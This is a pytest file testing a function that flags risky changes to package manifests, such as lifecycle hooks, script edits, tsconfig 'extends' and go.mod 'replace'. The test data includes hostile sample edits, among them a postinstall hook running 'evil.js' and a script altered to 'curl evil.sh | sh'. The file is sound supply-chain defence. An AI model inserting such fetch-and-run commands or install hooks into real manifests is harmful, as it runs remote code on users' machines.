"""Tests for the deterministic manifest scripts-key scan."""

import pytest

from manifest_risk import manifest_change_is_risky


def _pkg(scripts: str = "", extra: str = "") -> str:
    scripts_part = f', "scripts": {{{scripts}}}' if scripts else ""
    return f'{{"name": "x", "version": "1.0.0"{scripts_part}{extra}}}'


@pytest.mark.parametrize(
    "path, base, head, risky",
    [
        pytest.param(
            "frontend/package.json",
            _pkg('"test": "jest"'),
            _pkg('"test": "jest", "postinstall": "node evil.js"'),
            True,
            id="lifecycle-hook-added-inside-scripts",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg('"test": "jest"'),
            _pkg('"test": "jest && curl evil.sh | sh"'),
            True,
            id="existing-script-command-edited",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg('"test": "jest"'),
            _pkg('"test": "jest"').replace('"1.0.0"', '"1.0.1"'),
            False,
            id="version-bump-clean",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg(),
            _pkg(extra=', "pnpm": {"onlyBuiltDependencies": ["evil"]}'),
            True,
            id="pnpm-config-added",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg(),
            "{not json",
            True,
            id="unparseable-fails-closed",
        ),
        pytest.param(
            "pyproject.toml",
            "[project]\nname = 'x'\n",
            "[project]\nname = 'x'\n[project.scripts]\nx = 'pkg:main'\n",
            True,
            id="pyproject-scripts-added",
        ),
        pytest.param(
            "pyproject.toml",
            "[tool.poetry.scripts]\nx = 'a:main'\n",
            "[tool.poetry.scripts]\nx = 'b:main'\n",
            True,
            id="nested-tool-scripts-value-edited",
        ),
        pytest.param(
            "pyproject.toml",
            "[tool.ruff]\nline-length = 100\n",
            "[tool.ruff]\nline-length = 120\n",
            False,
            id="pyproject-tool-config-clean",
        ),
        pytest.param(
            "common/esbuilder/tsconfig.json",
            '{"compilerOptions": {"strict": true}}',
            '{"compilerOptions": {"strict": true}, "extends": "evil/tsconfig"}',
            True,
            id="tsconfig-extends-added",
        ),
        pytest.param(
            "common/esbuilder/tsconfig.json",
            '{"compilerOptions": {"strict": false}}',
            '{"compilerOptions": {"strict": true}}',
            False,
            id="tsconfig-option-clean",
        ),
        pytest.param("setup.py", "VERSION = '1.0'", "VERSION = '1.1'", True, id="setup-py-any-change"),
        pytest.param("posthog/api/insight.py", "a", "b", False, id="non-manifest-never-risky"),
    ],
)
def test_manifest_change_is_risky_structural(path: str, base: str, head: str, risky: bool) -> None:
    # Both reviewer bots demonstrated the line-scan bypass: editing an
    # existing script's command diffs as a line keyed by the script's own
    # name, so only a structural compare of the risky subtrees catches it.
    # Over-matching matters too - version bumps hard-denying would undo the
    # manifest calibration entirely.
    assert manifest_change_is_risky(path, base, head, diff_text="") is risky


@pytest.mark.parametrize(
    "path, diff_line, risky",
    [
        pytest.param("rust/Cargo.toml", '+build = "build.rs"', True, id="cargo-build-script"),
        pytest.param("rust/Cargo.toml", '+serde = "1.0"', False, id="cargo-dep-version-clean"),
        pytest.param("go.mod", "+replace example.com/x => ../local", True, id="go-mod-replace"),
        pytest.param("go.mod", "+require example.com/x v1.2.3", False, id="go-mod-require-clean"),
    ],
)
def test_line_scan_families(path: str, diff_line: str, risky: bool) -> None:
    # Cargo/go.mod keep the line scan because key and value share a line -
    # there is no value-only edit that hides the key from the diff.
    diff = f"--- a/{path}\n+++ b/{path}\n@@ -1,3 +1,3 @@\n context\n{diff_line}\n"
    assert manifest_change_is_risky(path, "irrelevant", "irrelevant2", diff) is risky


def test_tsconfig_jsonc_falls_back_to_line_scan() -> None:
    # tsconfig is often JSONC; failing closed on comments would hard-deny
    # every commented tsconfig edit and undo the calibration.
    jsonc = '{\n  // comment\n  "compilerOptions": {"strict": true},\n}'
    clean_diff = '--- a/tsconfig.json\n+++ b/tsconfig.json\n@@\n+  "strict": true,\n'
    risky_diff = '--- a/tsconfig.json\n+++ b/tsconfig.json\n@@\n+  "extends": "evil",\n'
    assert manifest_change_is_risky("tsconfig.json", jsonc, jsonc + " ", clean_diff) is False
    assert manifest_change_is_risky("tsconfig.json", jsonc, jsonc + " ", risky_diff) is True
